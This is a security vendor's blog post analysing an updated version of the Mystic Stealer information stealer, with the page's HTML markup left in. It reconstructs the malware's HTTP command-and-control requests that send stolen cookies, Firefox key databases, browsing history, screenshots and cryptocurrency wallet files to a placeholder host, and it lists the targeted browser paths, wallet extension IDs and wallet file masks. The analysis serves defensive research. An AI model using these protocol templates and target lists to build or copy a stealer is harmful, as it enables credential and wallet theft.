   text-darkBlue border-b-pink autofill:text-darkBlue" value=""/></div></form></div></div></div></section></div><div class="absolute top-0 overflow-hidden w-screen transition-all ease-in-out duration-300 opacity-0 -translate-x-24 min-h-0 pointer-events-none h-full"></div></div><div style="top:NaNpx" class="transition-all ease-in-out duration-300 opacity-0 absolute -z-1 bottom-0 bg-gradient-to-b from-black to-white/0 inset-0 w-screen pointer-events-none"></div></nav></header><div class="node-blog"><div class="light_hero_module_root__dky_w container py-20 md:py-35"><div class="flex justify-between flex-col lg:flex-row lg:items-center"><p class="text-darkGrey-100 typo-heading-4  mb-20 md:mb-20 lg:mb-0 lg:text-[36px]">Zscaler Blog</p><div class="lg:flex flex justify-between flex-row items-center"><p class="text-darkGrey font-bold  mb-20 text-[12px] mr-20 md:mb-0 lg:text-[14px]">Get the latest Zscaler blog updates in your inbox</p><a class="cta_root___bSOJ light_hero_module_subscribe__cbb4s cta_btnPrimary__j_EeL cta_btnDark__U__lq" href="#subscribe-blog" aria-label="Subscribe" target="_self" click-cta="btn-cta-section" rel="noopener">Subscribe</a></div></div></div><div class=""><div class="blog_post_header_module_root__YPrt6  min-h-0"><div class="tile-container relative px-20"><div class="

title="Check feeds"><svg xmlns="http://www.w3.org/2000/svg" width="13" height="13" fill="none" viewBox="0 0 13 13"><path fill="#848484" d="M1.821 9.357a1.82 1.82 0 0 1 1.822 1.822c0 .986-.82 7.093z"></path></svg></a></div><div class="sidebar_titlesWrapper__QElZv py-16"><p class="sidebar_navTopLabel__xl_5k">Contents</p><ol><li><a class="sidebar_link___4reK sidebar_linkActive__wuL2e" href="#introduction" rel="noopener">Introduction</a></li><li><a class="sidebar_link___4reK" href="#key-takeaways" rel="noopener">Key Takeaways</a></li><li><a class="sidebar_link___4reK" href="#technical-analysis" rel="noopener">Technical Analysis</a></li><li><a class="sidebar_link___4reK" href="#communications" rel="noopener">Communications</a></li><li><a class="sidebar_link___4reK" href="#conclusion" rel="noopener">Conclusion</a></li><li><a class="sidebar_link___4reK" href="#cloud-sandbox" rel="noopener">Cloud Sandbox</a></li><li><a class="sidebar_link___4reK" href="#indicators-of-compromise--iocs-" rel="noopener">Indicators of Compromise (IoCs)</a></li><li><a class="sidebar_link___4reK" href="#appendix" rel="noopener">Appendix</a></li><li><a class="sidebar_link___4reK" href="#more-blogs" rel="noopener">More blogs</a></li></ol></div><div class="sidebar_copyUrlWrapper__n99w0  hidden lg:flex" style="border-bottom:none"><button type="button" class="sidebar_copyUrl__P5IEw">Copy URL</button></div><div class="sidebar_copyUrlWrapper__n99w0 flex lg:hidden" style="border-bottom:none;border-top:none"><button type="button" class="sidebar_copyUrl__P5IEw">Copy URL</button></div></div></div></div></div></div></div></div><div class="hidden lg:block" style="margin-bottom:-0px"></div><div class="" id="introduction"><div class=""><div class="wysiwyg_module_root__WLg4d container"><div class="default-grid"><div class="col-span-full lg:col-span-8 lg:col-start-4"><div class="wysiwyg_module_content__XGnZp"><h2>Introduction</h2>

<p><span><span><span><span><span><span>Mystic Stealer is a relatively new downloader and information stealer that emerged in early 2023. The malware harvests data from a large number of web browsers and cryptocurrency wallet applications. Mystic can also be used to steal Steam game credentials and arbitrary files from an infected system. Mystic stands out for the level of obfuscation and improvements with each new version of the malware. The code continues to evolve and expand the data theft capabilities and the network communication was updated from a custom binary TCP-based protocol to an HTTP-based protocol. The shift to HTTP may be due to Mystic Stealer failing to beacon back to a C2 server in corporate environments, which frequently block network traffic on non-standard ports. The new modifications have led to increased popularity with criminal threat actors leveraging its loader functionality to distribute additional malware families including RedLine, DarkGate, and GCleaner.</span></span></span></span></span></span></p>

<p><span><span><span><span><span><span>In this blog, we will analyze the latest updates to Mystic Stealer as a follow-up to our previous </span></span></span></span></span></span><a href="/blogs/security-research/mystic-stealer"><span><span><span><span><span><u><span><span>report</span></span></u></span></span></span></span></span></a><span><span><span><span><span><span>.</span></span></span></span></span></span></p>

</div><div class="hidden"></div></div></div></div></div></div><div class="" id="key-takeaways"><div class=""><div class="wysiwyg_module_root__WLg4d container"><div class="default-grid"><div class="col-span-full lg:col-span-8 lg:col-start-4"><div class="wysiwyg_module_content__XGnZp"><h2>Key Takeaways</h2>

<ul>
	<li><span><span><span><span><span><span>Mystic Stealer is an information stealer that was first advertised in April 2023, which targets nearly 40 web browsers and more than 70 browser extensions.</span></span></span></span></span></span></li>
	<li><span><span><span><span><span><span>Mystic Stealer has been regularly updated with improvements to its code obfuscation, configuration, and methods of communication.</span></span></span></span></span></span></li>
	<li><span><span><span><span><span><span>The malware’s command and control (C2) communications have been updated from a custom encrypted binary protocol to HTTP.</span></span></span></span></span></span></li>
	<li><span><span><span><span><span><span>Mystic Stealer has added loader functionality in recent versions to complement its information stealing abilities.</span></span></span></span></span></span></li>
	<li><span><span><span><span><span><span>Mystic Stealer has been used by numerous threat groups that leverage it to distribute second-stage malware payloads including RedLine, DarkGate, and GCleaner.</span></span></span></span></span></span></li>
</ul>

</div><div class="hidden"></div></div></div></div></div></div><div class="" id="technical-analysis"><div class=""><div class="wysiwyg_module_root__WLg4d container"><div class="default-grid"><div class="col-span-full lg:col-span-8 lg:col-start-4"><div class="wysiwyg_module_content__XGnZp"><h2>Technical Analysis</h2>

<p><span><span><span><span><span><span>The latest variant of Mystic Stealer has introduced some notable changes in both the behavior of the malware and in the obfuscation. The entry point of the malware is very similar to the older variant. The malware exits if the current date is older than a specific hardcoded date. Figure 1 shows a comparison of the main function between the previous variant and the current variant.</span></span></span></span></span></span></p>

<p><img alt="Comparison of the WinMain function for the current and previous Mystic variants" data-entity-type="" data-entity-uuid="" src="/cdn-cgi/image/format=auto/sites/default/files/images/blogs/mystic-stealer-revisited/figure_1_variant_comparison.jpg" loading="lazy" decoding="async"/></p>

<p><sub><span><span><span><span><span><span>Figure 1: Comparison of the WinMain function for the current and previous Mystic variants</span></span></span></span></span></span></sub></p>

<p><span><span><span><span><span><span>In the latest variant of Mystic Stealer, the decryption of the malware C2s has been moved to a sub-function that is executed after the expiration date (probably to avoid leaking the C2s in memory if this time check fails).</span></span></span></span></span></span></p>

<h3><span><span><span><span><span><span>Embedded C2 Configuration</span></span></span></span></span></span></h3>

<p><span><span><span><span><span><span>The algorithm used to decrypt the list of C2 is the same </span></span></span></span></span></span><a href="https://github.com/threatlabz/tools/blob/main/mystic_stealer/decrypt_c2s.py"><span><span><span><span><span><u><span><span>custom XTEA-based algorithm</span></span></u></span></span></span></span></span></a><span><span><span><span><span><span> as the previous variant. However, after the custom XTEA layer has been decrypted, there is a sequence of HTTP C2s, separated by a “|” delimiter. The C2 path is stored among the list of obfuscated strings that are constructed and decoded using the stack as shown in Figure 2.</span></span></span></span></span></span></p>

<p><img alt="Mystic Stealer C2 path obfuscation" data-entity-type="" data-entity-uuid="" src="/cdn-cgi/image/format=auto/sites/default/files/images/blogs/mystic-stealer-revisited/figure_2_embedded_configuration.jpg" loading="lazy" decoding="async"/></p>

<p><sub><span><span><span><span><span><span>Figure 2. Mystic Stealer C2 path obfuscation</span></span></span></span></span></span></sub></p>

<h3><span><span><span><span><span><span>Information Stealing Configuration</span></span></span></span></span></span></h3>

<p><span><span><span><span><span><span>In the </span></span></span></span></span></span><a href="/blogs/security-research/mystic-stealer"><span><span><span><span><span><u><span><span>previous Mystic Stealer variant</span></span></u></span></span></span></span></span></a><span><span><span><span><span><span>, the target lists for web browsers, extensions (and their IDs), and cryptocurrency applications were embedded and obfuscated in the malware. In recent versions, the application target list is now downloaded from the C2 server instead of being hardcoded, as we will examine in the following section.</span></span></span></span></span></span></p>

</div><div class="hidden"></div></div></div></div></div></div><div class="" id="communications"><div class=""><div class="wysiwyg_module_root__WLg4d container"><div class="default-grid"><div class="col-span-full lg:col-span-8 lg:col-start-4"><div class="wysiwyg_module_content__XGnZp"><h2>Communications</h2><p><span>In the latest Mystic Stealer variant, all communications between the infected system and the C2 server are performed using HTTP POST requests. Unlike the previous variant that used RC4 to encrypt a custom binary TCP-based protocol, the latest variant does not implement any form of encryption. The data sent in the POST query is Base64 encoded, as shown below:</span></p><pre><code class="language-http">POST /loghub/master HTTP/1.1
Content-Type: multipart/form-data; boundary=&lt;boundary&gt;
Content-Length: NNN
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; InfoPath.1)
Host: X.X.X.X
Connection: Keep-Alive
Cache-Control: no-cache

--&lt;boundary&gt;
Content-Disposition: form-data; name=&quot;&lt;name&gt;&quot;


BASE64(&lt;data&gt;)
--&lt;boundary&gt;
</code></pre><p><span>The response data from the server is also encoded in Base64. The response starts with “OK\r\n” and is followed by any data returned by the C2 server for the specific query.</span></p><pre><code class="language-http">HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Thu, 11 Sep 2023 HH:MM:SS GMT
Content-Type: text/html; charset=utf-8
Content-Length: NNN
Connection: keep-alive
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Referrer-Policy: same-origin

BASE64(OK &lt;rest of data for the specific command, if necessary&gt;)</code></pre><h3><span>Registration</span></h3><p><span>The infected system (bot) starts communication with the C2 server by sending a POST request with data containing a variable named </span><em><span>hwid</span></em><span>, which includes a Base64 encoded bot ID generated based on information from the victim’s machine. A second variable with the name </span><em><span>build</span></em><span> contains the botnet ID, a value that is hardcoded in the binary of the malware. Once the C2 receives these initial two packets, the bot is registered.</span></p><pre><code class="language-http">POST /loghub/master HTTP/1.1
Content-Type: multipart/form-data; boundary=&lt;boundary&gt;
Content-Length: NNN
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; InfoPath.1)
Host: X.X.X.X
Connection: Keep-Alive
Cache-Control: no-cache

--&lt;boundary&gt;
Content-Disposition: form-data; name=&quot;hwid&quot;

BASE64(0123456789ABCDEF123456)
--&lt;boundary&gt;
Content-Disposition: form-data; name=&quot;build&quot;

BASE64(botnet_id)
--&lt;boundary&gt;--</code></pre><p><span>The C2 server generates and returns a session token (a 64 byte lowercase hexadecimal string) that will be used in subsequent packets, together with a set of binary flags that indicates which actions should be performed (take a screenshot, steal browser credentials, steal cryptocurrency wallets, etc).</span></p><pre><code class="language-http">HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Thu, 07 Sep 2023 HH:MM:SS GMT
Content-Type: text/html; charset=utf-8
Content-Length: NNN
Connection: keep-alive
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Referrer-Policy: same-origin

BASE64(OK &lt;token&gt;1|1|1|1|0|1|1|1|0|1|1)</code></pre><p><span>When the bot submits information to the C2 server, it sends a POST request with:</span></p><ul><li><span>A </span><em><span>filename</span></em><span> variable containing the name of the file being submitted, Base64 encoded</span></li><li><span>A </span><em><span>file</span></em><span> variable with the content of the file, also Base64 encoded</span></li><li><span>A </span><em><span>token</span></em><span> variable with the session token from the registration request</span></li></ul><pre><code class="language-http">POST /loghub/master HTTP/1.1
Content-Type: multipart/form-data; boundary=&lt;boundary&gt;
Content-Length: NNN
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; InfoPath.1)
Host: X.X.X.X
Connection: Keep-Alive
Cache-Control: no-cache

--&lt;boundary&gt;
Content-Disposition: form-data; name=&quot;filename&quot;

BASE64(&quot;example.txt&quot;)
--&lt;boundary&gt;
Content-Disposition: form-data; name=&quot;file&quot;

BASE64(&lt;content of example.txt&gt;)
Content-Disposition: form-data; name=&quot;token&quot;

BASE64(&lt;token&gt;)
–&lt;boundary&gt;--
</code></pre><p><span>If the request is valid, the server answers with an OK response.</span></p><p><span>After registration, the bot sends information about the infected system via a file named </span><em><span>SystemInformation.txt</span></em><span> that contains information similar to the following:</span></p><pre><code class="language-markdown">Build mark: zzzz
IP: {ip}
File Location: C:\Users\xxxx\AppData\Local\Temp\aaaa\bbbb.exe
UserName: xxxx
ComputerName: XXXX
Country: {country}
Location: {location}
Zip code: {zipcode}
TimeZone: {timezone}
HWID: 0123456789ABCDEF012345
Current language: English (United States)
ScreenSize: 1792x1120
Operation System: Windows 10 Pro x64

Available KeyboardLayouts: 
English (United States)

Hardwares: 
CPU: Intel(R) Core(TM) i9-9980HK CPU @ 2.40GHz
GPU: VMware SVGA 3D
RAM: 4293898240ll
</code></pre><h3><span>Information Stealing</span></h3><p><span>Once Mystic Stealer has registered and reported the infected system information, the binary flags from the C2 server determine whether to conduct data theft and load additional malware payloads. Mystic Stealer sends HTTP POST requests for specific target lists by specifying the value in a </span><em><span>msg</span></em><span> variable.</span></p><h4><span>Browsers</span></h4><p><span>Depending on the configuration, Mystic Stealer will steal data from Chromium-based browsers by first requesting a target list from the C2 server.</span></p><pre><code class="language-http">POST /loghub/master HTTP/1.1
Content-Type: multipart/form-data; boundary=&lt;boundary&gt;
Content-Length: NNN
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; InfoPath.1)
Host: X.X.X.X
Connection: Keep-Alive
Cache-Control: no-cache

--&lt;boundary&gt;
Content-Disposition: form-data; name=&quot;msg&quot;

BASE64(&quot;chromium-browsers&quot;)
--&lt;boundary&gt;
Content-Disposition: form-data; name=&quot;token&quot;

BASE64(&lt;token&gt;)
--&lt;boundary&gt;--
</code></pre><p><span>The Mystic Stealer C2 server will respond with a list of Chromium-based browsers to target. The Appendix section shows the full list of browsers that have been targeted.</span></p><pre><code class="language-markdown">Citrio|%localappdata%\CatalinaGroup\Citrio\User 
Data|Coowon|%localappdata%\Coowon\Coowon\User 
Data|Liebao|%localappdata%\liebao\User 
Data|QIP Surf|%localappdata%\QIP Surf\User 
Data|Orbitum|%localappdata%\Orbitum\User 
Data|Comodo Dragon|%localappdata%\Comodo\Dragon\User 
Data|Amigo|%localappdata%\Amigo\User\User 
Data|Torch|%localappdata%\Torch\User Data|Yandex 
Browser|%localappdata%\Yandex\YandexBrowser\User 
Data|Comodo|%localappdata%\Comodo\User 
Data|360Browser|%localappdata%\360Browser\Browser\User 
Data|Maxthon3|%localappdata%\Maxthon3\User Data|K-Melon|...</code></pre><p><span>Each element of the list contains the name of the browser and the path where the browser’s data is stored:</span> </p><pre><code class="language-markdown">Browser name 1|Browser path 1|..............|Browser N|Browser path N</code></pre><p><span>Mystic Stealer also retrieves a list of browser extensions to target.</span></p><pre><code class="language-http">POST /loghub/master HTTP/1.1
Content-Type: multipart/form-data; boundary=&lt;boundary&gt;
Content-Length: NNN
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; InfoPath.1)
Host: X.X.X.X
Connection: Keep-Alive
Cache-Control: no-cache

--&lt;boundary&gt;
Content-Disposition: form-data; name=&quot;msg&quot;

BASE64(extensions)
--&lt;boundary&gt;
Content-Disposition: form-data; name=&quot;token&quot;

BASE64(&lt;token&gt;)
--&lt;boundary&gt;--</code></pre><p><span>The Mystic Stealer C2 server will return the browser extensions configuration.</span></p><pre><code class="language-markdown">Coinbase Wallet|hnfanknocfeofbddgcijnmhnfnkdnaad|Guarda|hpglfhgfnhbgpjdenjgmdg
oeiappafln|EQUAL Wallet|blnieiiffboillknjnepogjhkgnoapac|Jaxx 
Liberty|cjelfplplebdjjenllpjcblmjkfcffne|BitApp 
Wallet|fihkakfobkmkjojpchpfgcmhfjnmnfpi|iWallet|kncchdigobghenbbaddoj
jnnaogfppfj|Wombat|amkmjjmmflddogmhpjloimipbofnfjih|MEW 
CX|nlbmnnijcnlegkjjpcfjclmcfggfefdm|GuildWallet|nanjmdknhkinifnkgdcgg
cfnhdaammmj|Saturn Wallet|nkddgncdjgjfcddamfgcmfnlhccnimig|Ronin 
Wallet|fnjhmkhhmkbjkkabndcnnogagogbneec|NeoLine|cphhlgmgameodnhkjdmkp
anlelnlohao|CLV Wallet|nhnkbkgjikgcigadomkphalanndcapjk|Liquality 
Wallet|kpfopkelmapcoipemfendmdcghnegimn|Terra 
Station|aiifbnbfobpmeekipheeijimdpnlpgpp|Keplr|dmkamcknogkgcdfhhbddcg
hachkejeap|Sollet|fhmfendgdocmcbmfikdcogofphimnkno|...
</code></pre><p><span>In this case, each element contains the name of the extension and the ID.</span></p><pre><code class="language-markdown">Extension name 1|Extension ID 1|....|Extension name N|Extension ID N</code></pre><p><span>Next, the malware downloads the legitimate </span><em><span>sqlite3.dll</span></em><span> DLL from the C2 server. This library is used to parse web browser SQLite database files.</span></p><pre><code class="language-http">POST /loghub/master HTTP/1.1
Content-Type: multipart/form-data; boundary=&lt;boundary&gt;
Content-Length: NNN
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; InfoPath.1)
Host: X.X.X.X
Connection: Keep-Alive
Cache-Control: no-cache

--&lt;boundary&gt;
Content-Disposition: form-data; name=&quot;msg&quot;

BASE64(&quot;sqlite3&quot;)
--&lt;boundary&gt;
Content-Disposition: form-data; name=&quot;token&quot;

BASE64(&lt;token&gt;)
--&lt;boundary&gt;--</code></pre><p><span>The response is the sqlite3 DLL Base64 encoded, as shown below:</span></p><pre><code class="language-http">HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Thu, 11 Sep 2023 HH:MM:SS GMT
Content-Type: text/html; charset=utf-8
Content-Length: NNN
Connection: keep-alive
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Referrer-Policy: same-origin

BASE64(OK BASE64(&lt;sqlite3 file&gt;))
</code></pre><p>The stolen browser data (if any) is sent to the C2 server. For example, cookies stolen from Microsoft Edge (which is Chromium-based) would be exfiltrated, as shown below:</p><pre><code class="language-http">POST /loghub/master HTTP/1.1
Content-Type: multipart/form-data; boundary=&lt;boundary&gt;
Content-Length: NNN
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; InfoPath.1)
Host: X.X.X.X
Connection: Keep-Alive
Cache-Control: no-cache

--&lt;boundary&gt;
Content-Disposition: form-data; name=&quot;filename&quot;

BASE64(“Cookies/Microsoft_Edge_Default.txt”)
--&lt;boundary&gt;
Content-Disposition: form-data; name=&quot;file&quot;

BASE64(&lt;content of Cookies/Microsoft_Edge_Default.txt&gt;)
Content-Disposition: form-data; name=&quot;token&quot;

BASE64(&lt;token&gt;)
–&lt;boundary&gt;--
</code></pre><p><span>Depending on the configuration, Mystic Stealer will also retrieve a list </span><em><span>gecko-browsers</span></em><span> to target.</span></p><pre><code class="language-http">POST /loghub/master HTTP/1.1
Content-Type: multipart/form-data; boundary=&lt;boundary&gt;
Content-Length: NNN
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; InfoPath.1)
Host: X.X.X.X
Connection: Keep-Alive
Cache-Control: no-cache

--&lt;boundary&gt;
Content-Disposition: form-data; name=&quot;msg&quot;

BASE64(&quot;gecko-browsers&quot;)
--&lt;boundary&gt;
Content-Disposition: form-data; name=&quot;token&quot;

BASE64(&lt;token&gt;)
--&lt;boundary&gt;--
</code></pre><p><span>The configuration format is identical to the </span><em><span>chromium-browser</span></em><span> list.</span></p><pre><code class="language-markdown">Firefox|%appdata%\Mozilla\Firefox\Profiles|Comodo 
IceDragon|%appdata%\Comodo\IceDragon\Profiles|BlackHawk|%appdata%\NET
GATE 
Technologies\BlackHawk\Profiles|Cyber
fox|%appdata%\8pecxstudios\Cyberfox\Profiles|K-Meleon|%appdata%\K-Meleon\Profiles|Icecat|%appdata%\Mo
zilla\icecat\Profiles</code></pre><p><span>Mystic Stealer will collect a number of database files from Firefox-based browsers containing cookies, certificates, keys, etc., as shown below:</span></p><pre><code class="language-http">POST /loghub/master HTTP/1.1
Content-Type: multipart/form-data; boundary=&lt;boundary&gt;
Content-Length: NNN
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; InfoPath.1)
Host: X.X.X.X
Connection: Keep-Alive
Cache-Control: no-cache

--&lt;boundary&gt;
Content-Disposition: form-data; name=&quot;filename&quot;

BASE64(&quot;Gecko/Firefox/&lt;profile&gt;.default/key4.db&quot;)
--&lt;boundary&gt;
Content-Disposition: form-data; name=&quot;file&quot;

BASE64(&lt;content of Gecko/Firefox/&lt;profile&gt;.default/key4.db&gt;)
Content-Disposition: form-data; name=&quot;token&quot;

BASE64(&lt;token&gt;)
–&lt;boundary&gt;--

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Thu, 11 Sep 2023 HH:MM:SS GMT
Content-Type: text/html; charset=utf-8
Content-Length: NNN
Connection: keep-alive
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Referrer-Policy: same-origin

BASE64(OK)

POST /loghub/master HTTP/1.1
Content-Type: multipart/form-data; boundary=&lt;boundary&gt;
Content-Length: NNN
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; InfoPath.1)
Host: X.X.X.X
Connection: Keep-Alive
Cache-Control: no-cache

--&lt;boundary&gt;
Content-Disposition: form-data; name=&quot;filename&quot;

BASE64(&quot;Gecko/Firefox/&lt;profile&gt;.default/cert9.db&quot;)
--&lt;boundary&gt;
Content-Disposition: form-data; name=&quot;file&quot;

BASE64(&lt;content of Gecko/Firefox/&lt;profile&gt;.default/cert9.db&gt;)
Content-Disposition: form-data; name=&quot;token&quot;

BASE64(&lt;token&gt;)
–&lt;boundary&gt;--

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Thu, 11 Sep 2023 HH:MM:SS GMT
Content-Type: text/html; charset=utf-8
Content-Length: NNN
Connection: keep-alive
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Referrer-Policy: same-origin

BASE64(OK)

POST /loghub/master HTTP/1.1
Content-Type: multipart/form-data; boundary=&lt;boundary&gt;
Content-Length: NNN
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; InfoPath.1)
Host: X.X.X.X
Connection: Keep-Alive
Cache-Control: no-cache

--&lt;boundary&gt;
Content-Disposition: form-data; name=&quot;filename&quot;

BASE64(&quot;Cookies/Firefox_&lt;profile&gt;.default.txt&quot;)
--&lt;boundary&gt;
Content-Disposition: form-data; name=&quot;file&quot;

BASE64(&lt;content of Cookies/Firefox_&lt;profile&gt;.default.txt&gt;)
Content-Disposition: form-data; name=&quot;token&quot;

BASE64(&lt;token&gt;)
–&lt;boundary&gt;--

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Thu, 11 Sep 2023 HH:MM:SS GMT
Content-Type: text/html; charset=utf-8
Content-Length: NNN
Connection: keep-alive
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Referrer-Policy: same-origin

BASE64(OK)</code></pre><p><span>If the browser history configuration flag (position 4) is set to 1, Mystic Stealer also sends the victim’s browsing history.</span></p><pre><code class="language-http">POST /loghub/master HTTP/1.1
Content-Type: multipart/form-data; boundary=&lt;boundary&gt;
Content-Length: NNN
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; InfoPath.1)
Host: X.X.X.X
Connection: Keep-Alive
Cache-Control: no-cache

--&lt;boundary&gt;
Content-Disposition: form-data; name=&quot;filename&quot;

BASE64(&quot;History/Firefox_8qjvd3qg.default-release.txt&quot;)
--&lt;boundary&gt;
Content-Disposition: form-data; name=&quot;file&quot;

BASE64(&lt;content of History/Firefox_8qjvd3qg.default-release.txt&gt;)
Content-Disposition: form-data; name=&quot;token&quot;

BASE64(&lt;token&gt;)
–&lt;boundary&gt;--</code></pre><p><span>The browser history file contains the website title (if available) and the URL as shown below:</span></p><pre><code class="language-markdown">Title: &lt;Title1&gt;
Url: &lt;url1&gt;

===============

Title: &lt;Title2&gt;
Url: &lt;url2&gt;

===============

...

===============

Title: &lt;TitleN&gt;
Url: &lt;urlN&gt;

===============</code></pre><h4><span>Screenshots</span></h4><p><span>If the screenshot configuration flag (position 8) is set to 1, Mystic Stealer captures and sends a screenshot of the victim’s machine.</span></p><pre><code class="language-http">POST /loghub/master HTTP/1.1
Content-Type: multipart/form-data; boundary=&lt;boundary&gt;
Content-Length: NNN
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; InfoPath.1)
Host: X.X.X.X
Connection: Keep-Alive
Cache-Control: no-cache

--&lt;boundary&gt;
Content-Disposition: form-data; name=&quot;filename&quot;

BASE64(&quot;Screenshot.jpeg&quot;)
--&lt;boundary&gt;
Content-Disposition: form-data; name=&quot;file&quot;

BASE64(&lt;content of Screenshot.jpeg&gt;)
Content-Disposition: form-data; name=&quot;token&quot;

BASE64(&lt;token&gt;)
–&lt;boundary&gt;--</code></pre><h4>Files</h4><p>Mystic Stealer also downloads a list of files to be stolen from the victim.</p><pre><code class="language-http">POST /loghub/master HTTP/1.1
Content-Type: multipart/form-data; boundary=&lt;boundary&gt;
Content-Length: NNN
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; InfoPath.1)
Host: X.X.X.X
Connection: Keep-Alive
Cache-Control: no-cache

--&lt;boundary&gt;
Content-Disposition: form-data; name=&quot;msg&quot;

BASE64(&quot;files&quot;)
--&lt;boundary&gt;
Content-Disposition: form-data; name=&quot;token&quot;

BASE64(&lt;token&gt;)
--&lt;boundary&gt;--
</code></pre><p>The Mystic Stealer C2 server returns a list of target files and directories to steal. For example, ThreatLabz has observed this feature used to steal cryptocurrency wallets as shown below:</p><pre><code class="language-markdown">Wallets/Jaxx 
Desktop|%appdata%\com.liberty.jaxx\IndexedDB\file__0.indexeddb.leveld
b|*.*|0|Wallets/Atomic|%appdata%\atomic\Local 
Storage\leveldb|*.*|0|Wallets/Binance|%appdata%\Binance|app-store.jso
n,simple-storage.json,.finger-print.fp|0|Wallets/Co
inomi|%appdata%\Coinomi\Coinomi\wallets|.wallet,*.config|0|Wallets/Exo
dus|%appdata%\Exodus|exodus.conf.json,window-state.json,passphrase.json,seed.seco,info
.seco|1|Wallets/Bitcoin 
Core|%appdata%\Bitcoin\wallets|wallet.dat|1|Wallets/Bitcoin Core 
Old|%appdata%\Bitcoin|*wallet*.dat|0|Wallets/Dogecoin|%appdata%\Bitco
in\wallets|*wallet*.dat|0|Wallets/Raven 
Core|%appdata%\Raven|*wallet*.dat|0|Wallets/Daedalus 
Mainnet|%appdata%\Daedalus Mainnet\wallets|she*.sqlite|0|Wallets/Blockstream 
Green|%appdata%\Blockstream\Green\wallets|*.*|1|Wallets/Wasabi 
Wallet|%appdata%\WalletWasabi\Client\Wallets|*.json|0|Wallets/Ethereu
m|%appdata%\Ethereum|keystore|0|Wallets/Electrum|%appdata%\Electrum\w
allets|*.*|0|Wallets/ElectrumLTC|%appdata%\Electrum-LTC\wallets|*.*|0
|Wallets/Electron 
Cash|%appdata%\ElectronCash\wallets|*.*|0|Wallets/MultiDoge|%appdata%
\MultiDoge|multidoge.wallet|0|Wallets/Jaxx Desktop 
Old|%appdata%\jaxx\Local Storage|file__0.localstorage|0</code></pre><p><span>The format for each targeted file is shown below:</span></p><pre><code class="language-markdown">Directory name|Location on disk|Target files mask|Flag</code></pre><p>The flag parameter indicates whether Mystic Stealer should recursively search the target directory. Once finished, a “done” msg is sent, to indicate the file stealing task is finished.</p><h4><span>Loader</span></h4><p><span>A “loader” msg can be sent by Mystic Stealer to the C2 server to request additional second-stage malware payloads, as shown below:</span></p><pre><code class="language-http">POST /loghub/master HTTP/1.1
Content-Type: multipart/form-data; boundary=&lt;boundary&gt;
Content-Length: NNN
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; InfoPath.1)
Host: X.X.X.X
Connection: Keep-Alive
Cache-Control: no-cache

--&lt;boundary&gt;
Content-Disposition: form-data; name=&quot;msg&quot;

BASE64(&quot;loader&quot;)
--&lt;boundary&gt;
Content-Disposition: form-data; name=&quot;token&quot;

BASE64(&lt;token&gt;)
--&lt;boundary&gt;--

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Thu, 11 Sep 2023 HH:MM:SS GMT
Content-Type: text/html; charset=utf-8
Content-Length: NNN
Connection: keep-alive
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Referrer-Policy: same-origin

BASE64(OK |1|BASE64(exe1)| |1|BASE64(exe2)| ....|1|BASE64(exeN))
</code></pre><p><span>The response to the loader request is an initial Base64 encoded layer containing an OK response with a set of one or more Base64 encoded executables:</span></p><p><img src="/cdn-cgi/image/format=auto/sites/default/files/images/blogs/mystic-stealer-revisited/figure_3_base64encoded_executables.jpg" data-entity-uuid="" data-entity-type="" alt="Base64 encoded executables downloaded by Mystic Stealer" loading="lazy" decoding="async"/></p><p><span><sub>Figure 3: Base64 encoded executables downloaded by Mystic Stealer</sub></span></p><p><span>The packet follows this format:</span></p><pre><code class="language-markdown">|1|BASE64(exe1)| |1|BASE64(exe2)| ....|1|BASE64(exeN)</code></pre><p><span>The parameter that precedes the Base64 encoded executable does not appear to be currently used, although it may indicate a potential feature that has yet to be implemented such as whether to write the binary to disk or inject it into another process. After downloading and executing these binary payloads, Mystic Stealer sends a final POST request with the message </span><em><span>“loadercode”</span></em><span>. The C2 server will then return an empty response.</span></p><h3><span>Debug Builds</span></h3><p><span>Zscaler ThreatLabz has found recent samples compiled in September and October 2023, which contain plaintext strings that typically are obfuscated in other samples:</span></p><p><img src="/cdn-cgi/image/format=auto/sites/default/files/images/blogs/mystic-stealer-revisited/figure_4_debug_version.jpg" data-entity-uuid="" data-entity-type="" alt="Mystic Stealer debug version plaintext strings" loading="lazy" decoding="async"/></p><p><span><sub>Figure 4: Mystic Stealer debug version plaintext strings</sub></span></p><p><span>In addition, these samples have string references with full file paths (instead of a relative path like </span><em><span>..\\chromiumbrowsers.cpp </span></em><span>in non-debug samples) to the original C++ code. Interestingly, the username in these full paths is </span><em><span>will</span></em><span>. ThreatLabz suspects these samples are compiled from code that is still in development where they could be testing improvements and new features.</span></p>
